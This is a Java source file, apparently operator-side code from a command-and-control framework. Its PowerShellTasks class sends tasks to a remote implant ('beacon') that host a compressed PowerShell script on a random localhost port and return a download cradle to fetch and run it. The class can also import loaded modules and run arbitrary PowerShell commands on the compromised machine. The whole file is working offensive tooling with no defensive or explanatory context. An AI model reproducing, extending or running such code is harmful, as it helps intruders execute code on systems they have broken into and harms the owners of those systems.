package beacon;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.CommonUtils;
import common.PowerShellUtils;

public class PowerShellTasks {
    protected AggressorClient client;
    protected String bid;

    public PowerShellTasks(AggressorClient client, String bid) {
        this.client = client;
        this.bid = bid;
    }

    public String getScriptCradle(String script) {
        String data = new PowerShellUtils(this.client).PowerShellCompress(CommonUtils.toBytes(script));
        int port = CommonUtils.randomPortAbove1024();
        CommandBuilder builder = new CommandBuilder();
        builder.setCommand(59);
        builder.addShort(port);
        builder.addString(data);
        byte[] setuptask = builder.build();
        this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, setuptask));
        return new PowerShellUtils(this.client).PowerShellDownloadCradle("http://127.0.0.1:" + port + "/");
    }

    public String getImportCradle() {
        if (!DataUtils.hasImportedPowerShell(this.client.getData(), this.bid)) {
            return "";
        }
        int port = CommonUtils.randomPortAbove1024();
        CommandBuilder builder = new CommandBuilder();
        builder.setCommand(79);
        builder.addShort(port);
        this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, builder.build()));
        return new PowerShellUtils(this.client).PowerShellDownloadCradle(new StringBuilder().append("http://127.0.0.1:").append(port).append("/").toString()) + "; ";
    }

    public void runCommand(String command) {
        String formatme = new PowerShellUtils(this.client).format(command, false);
        CommandBuilder builder = new CommandBuilder();
        builder.setCommand(78);
        builder.addLengthAndString("");
        builder.addLengthAndString(formatme);
        builder.addShort(1);
        byte[] task = builder.build();
        this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, task));
    }
}

